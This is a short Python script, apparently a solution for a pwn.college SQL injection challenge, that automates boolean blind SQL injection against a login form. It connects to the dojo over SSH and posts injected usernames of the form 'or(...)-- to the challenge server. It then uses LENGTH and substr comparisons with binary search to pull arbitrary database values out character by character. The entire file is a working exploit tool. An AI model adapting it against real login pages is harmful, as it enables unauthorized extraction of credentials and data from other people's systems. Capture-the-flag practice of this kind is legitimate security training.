from bool_injection import Injector
import requests
import re
import paramiko
import urllib.parse as urlparse

client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
client.connect("dojo.pwn.college", username="hacker")

def checker(payload: str) -> bool:
    stdin, stdout, stderr = client.exec_command(f"""curl 'http://challenge.localhost:80/' -X POST -d 'username={urlparse.quote(payload)}&password=abc123'""")
    result = stdout.read().decode()
    # print(result)
    if len(result) < 10 or '500' in result: 
        raise ConnectionError("Failed to request with message:", result)
    return 'Redirecting' in result

def console_checker(payload: str) -> bool:
    print(payload)
    return input() == '1'

templates = Injector.Templates(
    inject_template="'or({})--",
    search_template="(({target})<{value})",
    length_template="LENGTH(({}))",
    get_ith_template="unicode(substr(({target}), {value}, 1))",
    # check_ith_template=lambda target, position, value: f"({target})REGEXP('^.{{{position-1}}}{re.escape(chr(value)).replace('\\', '\\\\')}')" if position > 1 else f"({target})REGEXP('^{re.escape(chr(value)).replace('\\', '\\\\')}')"
    )

injector = Injector(templates, checker=checker, mode="binary", max_threads=4)

while True:
    target = input()
    print(injector.get_str(target))